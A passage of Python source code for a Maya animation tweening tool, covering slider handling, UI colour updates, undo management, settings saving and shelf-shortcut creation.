            rg_weight = 0.0
        if lf_weight < 0.0:
            lf_weight = 0.0

        self.tm.run(func_idx, lf_weight, rg_weight, ct_weight, auto_tangent=self.cfg_data['auto_tangent'])
        #print('weight  L {}  :  C {}  :  R {}'.format(round(lf_weight, 2), round(ct_weight, 2), round(rg_weight, 2)))

    def update_slider(self):
        self.slider_time_druation += time.time()-self.slider_st_time
        v_abs = abs(cmds.intSlider(self.element['weight_slider'], q=1, v=1))
        if v_abs >= 100:
            v_abs = 100

        # ui color
        cmds.text( self.element['percentage_text'], e=1, l=v_abs,
                  bgc=(func.lerp(self.color['bg'][0], self.color['highlight'][0], v_abs*0.01),
                       func.lerp(self.color['bg'][1], self.color['highlight'][1], v_abs*0.01),
                       func.lerp(self.color['bg'][2], self.color['highlight'][2], v_abs*0.01)))
        cmds.text(self.element['divider_top'], e=1,
                  bgc=(func.lerp(self.color['shadow'][0], self.color['highlight'][0], v_abs * 0.01),
                       func.lerp(self.color['shadow'][1], self.color['highlight'][1], v_abs * 0.01),
                       func.lerp(self.color['shadow'][2], self.color['highlight'][2], v_abs * 0.01)))
        cmds.text(self.element['divider_bottom'], e=1,
                  bgc=(func.lerp(self.color['shadow'][0], self.color['highlight'][0], v_abs * 0.01),
                       func.lerp(self.color['shadow'][1], self.color['highlight'][1], v_abs * 0.01),
                       func.lerp(self.color['shadow'][2], self.color['highlight'][2], v_abs * 0.01)))
        cmds.optionMenu(self.element['mode_menu'], e=1,
                    bgc=(func.lerp(self.color['shadow'][0], self.color['highlight'][0], v_abs * 0.01),
                         func.lerp(self.color['shadow'][1], self.color['highlight'][1], v_abs * 0.01),
                         func.lerp(self.color['shadow'][2], self.color['highlight'][2], v_abs * 0.01)))

        # function
        if self.slider_time_druation > self.slider_update_every_sec:
            error = self.tm.undo_chunk_open()
            try:
                self.exec_slider_func()
            except Exception as error:
                import traceback
                cmds.warning(str(traceback.format_exc()), sl=0)
                raise
            finally:
                if error:
                    cmds.warning('error from execute slider function. please check detail in script editor', sl=0)
                    cmds.undo()
            self.slider_st_time = time.time()
            self.slider_time_druation = 0.0

    def reset_slider(self):
        v_abs = abs(cmds.intSlider(self.element['weight_slider'], q=1, v=1))
        if v_abs != 0:
            cmds.intSlider(self.element['weight_slider'], e=1, v=0)
            cmds.text(self.element['percentage_text'], e=1, bgc=self.color['shadow'])
            cmds.text(self.element['divider_top'], e=1, bgc=self.color['shadow'])
            cmds.text(self.element['divider_bottom'], e=1, bgc=self.color['shadow'])
            cmds.optionMenu(self.element['mode_menu'], e=1, bgc=self.color['shadow'])

    def save_ui_setting(self):
        self.cfg_data['last_mode'] = cmds.optionMenu(self.element['mode_menu'], q=1, v=1)
        self.cfg_data['auto_tangent'] = cmds.menuItem(self.element['auto_tangent_mi'], q=1, checkBox=1)
        self.save_cfg()

    def drop_slider(self):
        def f_pause(sec):
            start_time = time.time()
            while True:
                current_time = time.time()
                elapsed_time = current_time - start_time
                if elapsed_time >= sec:
                    break

        self.tm.undo_chunk_close()
        self.tm.clear_cache()
        self.reset_slider()
        self.save_ui_setting()
        f_pause(0.225)

    def create_shortcut_shelf(self):
        func_name = cmds.optionMenu(self.element['mode_menu'], q=1, v=1)
        func_idx = self.tm.func_name_ls.index(func_name)
        sub_func_name = cmds.confirmDialog(message='Select function side',
                                         button=[self.tm.func_set[func_idx]['lf_label'],
                                                 self.tm.func_set[func_idx]['rg_label']])
        side_label = 'lf_label' if sub_func_name == self.tm.func_set[func_idx]['lf_label'] else 'rg_label'
        percent_value = cmds.promptDialog(message='[  {}  ]\nSet weight percentage ( 10 % - 90 % )'.format(sub_func_name),
                                         button=['Create', 'Cancel'], text=75)
        if not percent_value == 'Create':
            return None
        weight_value = float(cmds.promptDialog(q=1, text=1)) * 0.01
        weight_value = 0.1 if weight_value < 0.1 else weight_value
        weight_value = 1.0 if weight_value > 1.0 else weight_value
        util.create_shelf_fuction(func_idx, side_label, weight_value, self.tm.func_set[func_idx][side_label])

if __name__ in __file__:
    tm = tween_machine()
    kt = keysTweener(tm)
    kt.show_ui()